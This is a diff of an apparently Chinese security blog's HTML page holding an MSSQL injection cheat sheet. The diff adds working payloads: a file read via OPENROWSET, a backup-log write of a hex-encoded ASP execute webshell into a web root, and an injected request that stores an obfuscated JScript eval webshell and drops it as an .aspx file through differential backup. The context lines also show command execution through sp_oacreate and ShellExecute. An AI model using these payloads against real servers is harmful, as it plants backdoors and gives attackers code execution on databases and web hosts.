@@ -143,7 +143,7 @@
                   
                   <span class="post-meta mr-2">
                     <i class="iconfont icon-chart"></i>
-                    1.1k 字
+                    1.2k 字
                   </span>
                 
 
@@ -153,7 +153,7 @@
                       <i class="iconfont icon-clock-fill"></i>
                     
                     
-                    17
+                    19
                      分钟
                   </span>
                 
@@ -190,12 +190,8 @@ and 1&#x3D;(select top N * from 指定数据库..指定表名 FOR XML PATH(&#39;
 
 检测XP_DIRTREE读子目录：
 and 1&#x3D;(SELECT count(*) FROM master.dbo.sysobjects WHERE name&#x3D; &#39;xp_dirtree&#39;) #dirtree 得使用指定列  创建表得用这个字段subdirectory
-
-1;exec&#x2F;*(*&#x2F;myexec 0x73656c65637420636f6e7665727428696e742c404076657273696f6e29
-
+ 
 execute 绕waf</code></pre>
-
-
 
 <h2 id="IIS配置文件"><a href="#IIS配置文件" class="headerlink" title="IIS配置文件"></a>IIS配置文件</h2><pre><code class="hljs plain">默认iis目录 C:&#x2F;Inetpub&#x2F;wwwroot
 
@@ -210,6 +206,7 @@ win2008&#x2F;2012  C:\Windows\System32\inetsrv\config\applicationHost.config</co
 <pre><code class="hljs plain">execute master..xp_dirtree &#39;C:\&#39;,1,1;</code></pre>
 
 <p>二、使用openrowset读取文件</p>
+<pre><code class="hljs plain">select * from OPENROWSET(BULK N&#39;C:\Users\Public\a.asp&#39;, SINGLE_BLOB) rs</code></pre>
 <p><img src="https://l1e.oss-cn-beijing.aliyuncs.com/img/20210617153104.png" srcset="/img/loading.gif" alt="image-20210617153054557"></p>
 <h2 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h2><p>有杂质写文件之备份、差异备份 backup database </p>
 <p>有杂质写文件之日志备份 backup log  </p>
@@ -217,8 +214,7 @@ win2008&#x2F;2012  C:\Windows\System32\inetsrv\config\applicationHost.config</co
 <p>SP_OACreate无杂质写文件之调用ADODB.Stream对象</p>
 <p>SP_OACreate写文件之调用scripting.filesystemobject对象</p>
 <h3 id="存储过程写文件-sp-makewebtask"><a href="#存储过程写文件-sp-makewebtask" class="headerlink" title="存储过程写文件 - sp_makewebtask"></a>存储过程写文件 - sp_makewebtask</h3><blockquote>
-<p> 适用于SQL Server2008以前版本,2008被移除</p>
-<p> sp_makewebtask存储过程 导shell (重建办法，先找台正常主机，sp_helptext ‘sp_makewebtask’,将他的SQL语句重新拷到目标机器执行一次就行了)</p>
+<p> 适用于SQL Server2008以前版本,2008被移除<br> sp_makewebtask存储过程 导shell (重建办法，先找台正常主机，sp_helptext ‘sp_makewebtask’,将他的SQL语句重新拷到目标机器执行一次就行了)</p>
 </blockquote>
 <p>开启和关闭<strong>sp_makewebtask</strong></p>
 <pre><code class="hljs plain">exec sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;exec sp_configure &#39;Web Assistant Procedures&#39;,1;RECONFIGURE; 开启
@@ -246,17 +242,21 @@ exec @ret &#x3D; sp_oamethod @f, &#39;writeline&#39;, NULL,&#39;&lt;%execute(req
 <h3 id="log备份-backup-log"><a href="#log备份-backup-log" class="headerlink" title="log备份 - backup log"></a>log备份 - backup log</h3><blockquote>
 <p>有杂质体积小，public权限即可</p>
 </blockquote>
-<pre><code class="hljs plain">alter database 库名 set RECOVERY FULL
-create table cmd (a image)
-backup log 库名 to disk &#x3D; &#39;c:\&#39; with init
-insert into cmd (a) values (0x3C25657865637574652872657175657374282261222929253E)
-backup log 库名 to disk &#x3D; &#39;c:\2.asp&#39;</code></pre>
+<pre><code class="hljs plain">drop table test_tmp;
+alter database XFData set RECOVERY FULL;
+create table  test_tmp  (a image);
+backup log XFData to disk &#x3D; &#39;D:\WebRoot\asp.bak&#39; with init;
+insert into test_tmp (a) values (0x3C25657865637574652872657175657374282261222929253EDA);
+backup log XFData to disk &#x3D; &#39;D:\webroot\123.asp&#39;</code></pre>
 
 <h3 id="差异备份写文件-backup-database"><a href="#差异备份写文件-backup-database" class="headerlink" title="差异备份写文件 - backup database"></a>差异备份写文件 - backup database</h3><blockquote>
 <p>有杂质体积大，public权限即可</p>
 </blockquote>
-<pre><code class="hljs plain">backup database 库名 to disk &#x3D; &#39;c:\bak.bak&#39;;
-create table [dbo].[test] ([cmd] [image]);
+<pre><code class="hljs plain">id&#x3D;1;use test create table cmd(str image);insert into cmd(str) values (&#39;&lt;%@PAGE LANGUAGE&#x3D;JSCRIPT%&gt;&lt;%var PAY:String&#x3D;Request[&quot;\x61\x62\x63\x64&quot;];eval(PAY,&quot;\x75\x6E\x73\x61&quot;+&quot;\x66\x65&quot;);%&gt;&#39;);--
+id&#x3D;1;backup database test to disk&#x3D;&#39;D:\web\css\22.aspx&#39; with differential,format;--
+
+backup database 库名 to disk &#x3D; &#39;c:\bak.bak&#39;;
+create table [dbo].[test] ([cmd] [image]); 
 insert into test(cmd) values(0x3C25657865637574652872657175657374282261222929253E)
 backup database 库名 to disk&#x3D;&#39;C:\d.asp&#39; WITH DIFFERENTIAL,FORMAT;</code></pre>
 
@@ -309,7 +309,7 @@ declare @shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec s
 exec sp_oacreate &#39;Shell.Application&#39;, @o out
 exec sp_oamethod @o, &#39;ShellExecute&#39;,null, &#39;cmd.exe&#39;,&#39;cmd &#x2F;c whoami &gt;e:\test.txt&#39;,&#39;c:\windows\system32&#39;,&#39;&#39;,&#39;1&#39;;</code></pre>
 
-<h3 id="CLR"><a href="#CLR" class="headerlink" title="CLR"></a>CLR</h3><h2 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h2><h2 id="ref"><a href="#ref" class="headerlink" title="ref"></a>ref</h2><p>SQL Server的CLR在渗透测试中的应用.pdf<br><a href="https://www.cnblogs.com/linjincheng/p/9728853.html" target="_blank" rel="noopener">https://www.cnblogs.com/linjincheng/p/9728853.html</a></p>
+<h3 id="CLR"><a href="#CLR" class="headerlink" title="CLR"></a>CLR</h3><h2 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h2><h2 id="ref"><a href="#ref" class="headerlink" title="ref"></a>ref</h2><p>SQL Server的CLR在渗透测试中的应用.pdf<br><a href="https://www.cnblogs.com/linjincheng/p/9728853.html" target="_blank" rel="noopener">https://www.cnblogs.com/linjincheng/p/9728853.html</a><br><a href="https://www.jianshu.com/p/2d3d46f84cfd" target="_blank" rel="noopener">https://www.jianshu.com/p/2d3d46f84cfd</a> </p>
 
             </article>
             <hr>
